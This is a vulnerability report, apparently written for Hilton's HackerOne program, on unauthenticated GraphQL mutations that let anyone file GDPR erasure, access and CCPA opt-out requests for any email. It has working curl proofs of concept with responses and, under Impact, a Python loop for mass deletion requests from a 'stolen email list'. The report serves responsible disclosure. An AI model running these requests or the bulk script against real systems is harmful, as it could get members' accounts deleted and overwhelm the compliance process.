# HT-014: Unauthenticated GDPR/CCPA Privacy Request Submission for Any Email Address

**Program:** Hilton HackerOne  
**Asset:** `hilton.com` (Tier A)  
**Severity:** High  
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)  
**CWE:** CWE-306 — Missing Authentication for Critical Function  
**Status:** Ready to submit

---

## Summary

Two GraphQL mutations at `https://www.hilton.com/graphql/customer` accept **GDPR and CCPA privacy requests for any email address without any authentication**. Both execute with `dx-completeness: 1` and return unique ticket IDs, confirming they create real compliance records in Hilton's systems.

| Mutation | Purpose | Auth? |
|----------|---------|-------|
| `createGuestGdpr` | Submit GDPR data deletion, data access, or "do not sell" requests | ❌ NO |
| `createGuestSharePersonalInfoOptOut` | Submit CCPA "Do Not Sell My Personal Information" opt-out | ❌ NO |

An unauthenticated attacker can:
1. Submit fraudulent GDPR **data deletion requests** (`requestToDelete: true`) for any email address → Hilton's compliance team is legally required (Art. 17 GDPR) to delete the account within 30 days
2. Submit fraudulent GDPR **data access requests** (`requestToKnow: true`) for any email address → triggers compliance workflow
3. Submit CCPA **"Do Not Sell"** requests (`nosell: true`) for arbitrary California residents
4. File requests in **bulk for thousands of email addresses**, overwhelming Hilton's compliance team and potentially triggering mass account deletions

---

## Proof of Concept

### PoC 1: Submit GDPR Data Deletion Request for Any Email (No Auth)

```bash
# Submit GDPR right-to-erasure request for victim@example.com — NO authentication required
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{
    "operationName": "gdprDelete",
    "query": "mutation gdprDelete($input: GuestGdprInput!, $language: String!) { createGuestGdpr(guestGdprInput: $input, language: $language) { _id error { code message } } }",
    "variables": {
      "input": {
        "country": "US",
        "emailAddress": "victim@example.com",
        "phoneNumber": "+15551234567",
        "name": {"firstName": "Victim", "lastName": "User"},
        "request": {"requestToDelete": true}
      },
      "language": "en"
    }
  }'
```

**Response (HTTP 200, `dx-completeness: 1`):**
```json
{
  "data": {
    "createGuestGdpr": {
      "_id": "5eb8e16fe233c3964209...",
      "error": null
    }
  }
}
```

A real ticket ID (`_id`) is returned, confirming a GDPR compliance record was created.

### PoC 2: Submit GDPR Data Access Request (requestToKnow)

```bash
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{
    "operationName": "gdprAccess",
    "query": "mutation gdprAccess($input: GuestGdprInput!, $language: String!) { createGuestGdpr(guestGdprInput: $input, language: $language) { _id error { code message } } }",
    "variables": {
      "input": {
        "country": "US",
        "emailAddress": "victim@example.com",
        "phoneNumber": "+15551234567",
        "name": {"firstName": "Victim", "lastName": "User"},
        "request": {"requestToKnow": true}
      },
      "language": "en"
    }
  }'
```

**Response (HTTP 200, `dx-completeness: 1`):**
```json
{"data": {"createGuestGdpr": {"_id": "f0f8aa515c08a64d4a3b...", "error": null}}}
```

### PoC 3: Submit CCPA Do-Not-Sell Request for Any California Resident

```bash
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{
    "operationName": "ccpaOptOut",
    "query": "mutation ccpaOptOut($input: GuestSharePersonalInfoOptOutInput!, $language: String!) { createGuestSharePersonalInfoOptOut(input: $input, language: $language) { _id error { code message } } }",
    "variables": {
      "input": {
        "country": "US",
        "state": "CA",
        "requesterEmailAddress": "victim@example.com",
        "requesterName": {"firstName": "Victim", "lastName": "User"},
        "request": {"nosell": true, "nosellThirdParties": true}
      },
      "language": "en"
    }
  }'
```

**Response (HTTP 200, `dx-completeness: 1`):**
```json
{"data": {"createGuestSharePersonalInfoOptOut": {"_id": "b245521184d8c6fc9272...", "error": null}}}
```

---

## Confirmation Table

| Test | Mutation | Request Type | dx-completeness | error | _id returned |
|------|----------|-------------|-----------------|-------|--------------|
| 1 | `createGuestGdpr` | `requestToDelete: true` | **1** | null | ✓ (unique ticket ID) |
| 2 | `createGuestGdpr` | `requestToKnow: true` | **1** | null | ✓ (unique ticket ID) |
| 3 | `createGuestGdpr` | `nosell: true, nosellThirdParties: true` | **1** | null | ✓ (unique ticket ID) |
| 4 | `createGuestSharePersonalInfoOptOut` | `nosell: true` (CCPA) | **1** | null | ✓ (unique ticket ID) |

All requests submitted **without any Hilton Honors session cookie, Authorization header, or CSRF token**.

---

## Available GDPR Request Types (GuestGdprRequestInput)

The schema exposes the full set of privacy request types that can be submitted without authentication:

| Field | Description | Legal Framework |
|-------|-------------|-----------------|
| `requestToDelete` | Right to Erasure — delete account | GDPR Art. 17, CCPA |
| `requestToKnow` | Right of Access — disclose all data | GDPR Art. 15 |
| `requestToCorrect` | Right to Rectification | GDPR Art. 16 |
| `nosell` | Do Not Sell My Personal Information | CCPA |
| `nosellThirdParties` | Do Not Sell to Third Parties | CCPA |
| `nosellBehavioralMarketing` | Do Not Sell for Marketing | CCPA |
| `nosellHGV` | Do Not Share with Hilton Grand Vacations | CCPA |
| `remove` | Remove personal data | GDPR/CCPA |
| `restrict` | Restrict processing | GDPR Art. 18 |
| `object` | Object to processing | GDPR Art. 21 |
| `withdraw` | Withdraw consent | GDPR Art. 7(3) |
| `rightToDataPortability` | Data portability request | GDPR Art. 20 |
| `rightToLimitUseOfSensitivePersonalInformation` | Limit sensitive data use | CPRA |
| `optIn` / `optInHGV` / `optInThirdParties` | Re-opt into data sharing | Various |
| `access` | Access request variant | Various |
| `get` | Data retrieval request | Various |

---

## Impact

### 1. Mass Targeted Account Deletion (GDPR weaponization)
An attacker with a list of Hilton Honors email addresses (from a data breach, OSINT, or purchased list) can submit GDPR deletion requests for thousands of accounts. Under GDPR Art. 17, Hilton is legally required to process erasure requests within 30 days without verifying the requester's identity beyond the email address:

```python
# Attack script — submit deletion requests for all Hilton member emails
emails = ["member1@gmail.com", "member2@yahoo.com", ...]  # stolen email list
for email in emails:
    requests.post("https://www.hilton.com/graphql/customer", json={
        "query": "mutation { createGuestGdpr(guestGdprInput: {country: \"US\", emailAddress: \"%s\", phoneNumber: \"+15551234567\", name: {firstName: \"Request\", lastName: \"Submitted\"}, request: {requestToDelete: true}}, language: \"en\") { _id } }" % email
    })
# Hilton compliance team now has thousands of fraudulent deletion requests to process
```

Impact: Mass deletion of legitimate Hilton Honors accounts; overwhelming compliance team.

### 2. Compliance Team DoS
Filing thousands of fraudulent GDPR requests forces Hilton's compliance team to process each one within the legally required 30-day window. At scale, this creates a denial-of-service condition for the compliance function, potentially causing Hilton to miss legitimate requests and violate GDPR.

### 3. CCPA "Do Not Sell" Manipulation for Competitors
A competitor could file CCPA "Do Not Sell" opt-outs for all of Hilton's California customer base, preventing Hilton from using their data for personalization and marketing to California residents (CCPA/CPRA compliance requires honoring these requests).

### 4. Fraudulent Data Access Requests (Privacy Abuse)
Submitting `requestToKnow: true` for a target's email may cause Hilton to send a data export to the email address on the account — the victim's account, not the attacker's email — but creates fraudulent compliance records and wastes compliance resources.

---

## Root Cause

Same root cause as HT-013: the WSO2 API Gateway resolves the `Authorization` header name to `null`, silently skipping token validation. The GraphQL BFF (`dx-guests-gql`) passes the request to the backend compliance system without verifying that the caller is authenticated as the account holder for the submitted email address.

---

## Reproduction (Step-by-step)

1. Ensure you are NOT authenticated (no Hilton Honors cookies or tokens)
2. Execute PoC 1 with any email address
3. Observe `dx-completeness: 1` + unique `_id` in response
4. The `_id` represents a real compliance ticket created in Hilton's GDPR system

---

## Recommendations

1. **Require authentication for both mutations**: `createGuestGdpr` and `createGuestSharePersonalInfoOptOut` must verify the caller is authenticated as the account owner for the submitted email address.

2. **Email ownership verification**: Even for compliance requests (which by design allow non-members to request data deletion), implement a confirmation email challenge-response before creating a compliance ticket. Do not create tickets on the first request without verification.

3. **Rate limiting**: Implement per-IP rate limits to prevent bulk submission of fraudulent compliance requests.

4. **Audit existing tickets**: Review GDPR/CCPA request records for bulk/automated patterns to identify if exploitation has already occurred.

---

## References

- CWE-306: Missing Authentication for Critical Function
- GDPR Article 17: Right to erasure
- GDPR Article 15: Right of access
- CCPA § 1798.120: Consumer's right to opt-out of sale
- CPRA: California Privacy Rights Act amendment to CCPA
- HT-013 (same program): Root cause — WSO2 null Authorization header misconfiguration
